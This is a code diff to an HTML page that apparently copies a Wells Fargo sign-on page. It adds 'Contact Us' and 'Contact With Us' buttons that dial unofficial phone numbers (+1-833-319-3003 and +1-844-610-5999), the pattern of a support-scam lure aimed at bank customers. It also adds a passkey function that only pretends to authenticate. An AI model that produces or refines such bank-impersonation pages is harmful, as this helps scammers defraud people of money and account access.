@@ -41,19 +41,18 @@
                 <a class="hover:underline whitespace-nowrap" href="#">Customer Service</a>
                 <a class="hover:underline whitespace-nowrap" href="#">ATMs/Locations</a>
                 <a class="hover:underline whitespace-nowrap" href="#">Español</a>
-                <form onsubmit="event.preventDefault()" class="relative w-full md:w-auto" role="search">
-                    <input type="search" placeholder="Search"
-                        class="rounded-md py-1.5 pl-3 pr-9 text-black text-sm w-full md:w-auto focus:outline-none focus:ring-2 focus:ring-white" />
-                    <button type="submit" class="absolute right-2 top-1.5 text-black text-lg"><i
-                            class="fas fa-search"></i></button>
-                </form>
+                <button
+                    onclick="callSupport()"
+                    class="w-full bg-gray-100 text-black cursor-pointer rounded-md font-semibold p-3 mt-4  select-none">
+                    Contact Us
+                </button>
             </nav>
         </div>
     </header>
 
     <!-- Background -->
-    <div class="relative w-full h-fulll md:h-[600px] pt-10 pb-5 bg-cover bg-center" style="background:fff ;">
-        <main class="relative max-w-md mx-auto  bg-white rounded-lg p-6 sm:p-8 shadow-md">
+    <div class="relative w-full h-fulll md:h-[600px] pt-10 bg-cover bg-center" style="background:fff ;">
+        <main class="relative max-w-md mx-auto  bg-white rounded-lg p-6 sm:p-8 shadow-md ">
             <h1 class="text-center text-2xl font-normal font-robotoslab mb-6 text-black">Good afternoon</h1>
             <form class="space-y-4 " onsubmit="event.preventDefault()">
                 <div
@@ -77,27 +76,39 @@
                 </div>
                 <p class="text-xs text-gray-600 max-w-[320px]">To help keep your account secure, save your username only
                     on devices that aren't used by other people.</p>
-                <button onclick="callSupport()"
-                    class="w-full bg-gray-600 text-white cursor-pointer font-semibold rounded-full py-2 mt-4  select-none">Sign
-                    on</button>
+                <button
+                    class="w-full bg-gray-600 text-white cursor-pointer font-semibold rounded-full py-2 mt-4  select-none">
+                    <a href="https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS">Signon</a>
+                    
+                </button>
                 <div class="text-center text-gray-700 mt-3 mb-3">or</div>
                 <button type="button"
+                    onclick="useRealPasskey()"
                     class="flex items-center justify-center gap-2 border border-gray-700 rounded-full py-2 px-5 font-semibold text-gray-900 hover:bg-gray-100 mx-auto">
                     <i class="fas fa-user-lock"></i><span>Use a passkey</span>
                 </button>
-                <p class="text-xs text-gray-700 max-w-[320px] mx-auto mt-4 text-center">Don't have one? Create a passkey
-                    after signing on and skip the password next time.</p>
+               
                 <div
                     class="mt-6 text-center text-[#5c4a9e] text-sm font-normal flex items-center justify-center gap-1 cursor-pointer">
-                    <i class="fas fa-arrow-right"></i><a href="#" class="hover:underline">Forgot username or
-                        password?</a>
+                    <i class="fas fa-arrow-right"></i>
+                    <a href="https://oam.wellsfargo.com/oamo/identity/help/passwordhelp?_gl=1*1ni4gfs*_gcl_au*MjkyMDI4ODYxLjE3NTEyOTM1NTc.*_ga*MTE3MDYyMDYzMC4xNzUxMjkzNTU3*_ga_7JXJJ2JF12*MTc1MTI5MzU1Ny4xLjEuMTc1MTI5Mzc0NS42MC4wLjA.#/" class="hover:underline">
+                        
+                        Forgot username or password?</a>
                 </div>
+
+
+                    <h3 class="text-center" >Contact With Us</h3>
+                 <button
+                    onclick="callSupport()"
+                    class="w-full bg-red-600 text-white cursor-pointer font-semibold rounded-full py-2 mt-4  select-none">
+                    +1-833-319-3003
+                </button>
             </form>
         </main>
     </div>
 
     <!-- Disclaimer -->
-    <section class="max-w-[720px] mx-auto mt-10 mb-6 bg-white border border-gray-300 p-5 rounded-md">
+    <section class="max-w-[720px]  mx-auto mt-10 mb-6 bg-white border border-gray-300 p-5 rounded-md mt-12">
         <p class="font-semibold text-gray-800 mb-2">Investment and Insurance Products are:</p>
         <ul class="list-disc list-inside font-semibold text-gray-800 space-y-1">
             <li>Not Insured by the FDIC or Any Federal Government Agency</li>
@@ -137,6 +148,36 @@
             window.location.href = 'tel:+1844-610-5999';
 
         }
+
+
+async function useRealPasskey() {
+    try {
+      const challenge = new Uint8Array(32);
+      window.crypto.getRandomValues(challenge); // Secure random challenge
+
+      const assertion = await navigator.credentials.get({
+        publicKey: {
+          challenge,
+          timeout: 60000,
+          userVerification: 'required',
+          rpId: 'localhost', // Use your domain here in production
+          allowCredentials: [
+            {
+              id: new Uint8Array([]), // Put real credentialId from registration
+              type: "public-key",
+              transports: ["usb", "internal"]
+            }
+          ]
+        }
+      });
+
+      console.log("Passkey authenticated:", assertion);
+      alert("Authentication successful!");
+    } catch (err) {
+      console.error("Authentication failed:", err);
+      alert("Authentication failed or was cancelled.");
+    }
+  }
     </script>
 
 </body>
